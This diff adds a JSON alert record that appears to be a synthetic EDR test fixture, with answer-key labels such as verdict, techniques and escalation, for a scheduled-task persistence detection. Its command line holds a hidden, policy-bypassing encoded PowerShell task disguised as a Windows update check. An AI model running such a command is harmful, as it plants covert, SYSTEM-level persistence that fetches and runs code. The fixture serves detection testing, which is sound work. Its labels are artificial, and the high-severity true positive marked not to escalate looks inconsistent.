@@ -1,0 +1,45 @@
+{
+  "alert_id": "TP-04-persistence-scheduled-task",
+  "source": "edr",
+  "rule_name": "Scheduled task created with encoded PowerShell action",
+  "detected_at": "2026-03-14T05:41:00+00:00",
+  "severity": "high",
+  "category": "endpoint",
+  "device": {
+    "hostname": "WKSTN-101",
+    "ip": "10.20.30.101",
+    "os": "Windows 11"
+  },
+  "principal": {
+    "username": "a.kaur",
+    "domain": "CORP"
+  },
+  "parent_process": {
+    "name": "cmd.exe",
+    "path": "C:\\Windows\\System32\\cmd.exe"
+  },
+  "process": {
+    "name": "schtasks.exe",
+    "path": "C:\\Windows\\System32\\schtasks.exe",
+    "command_line": "schtasks /create /tn WindowsUpdateCheck /sc daily /st 03:00 /tr \"powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==\""
+  },
+  "scheduled_tasks": [
+    {
+      "name": "WindowsUpdateCheck",
+      "action": "powershell.exe -nop -w hidden -ep bypass -File C:\\ProgramData\\upd.ps1",
+      "trigger": "daily 03:00",
+      "run_as": "SYSTEM"
+    }
+  ],
+  "labels": {
+    "verdict": "true_positive",
+    "techniques": [
+      "T1053.005",
+      "T1027",
+      "T1059.001"
+    ],
+    "should_escalate": false,
+    "why": "A daily scheduled task whose action is a base64 PowerShell payload that decodes to a download-and-execute one-liner, staged in ProgramData.",
+    "synthetic": true
+  }
+}
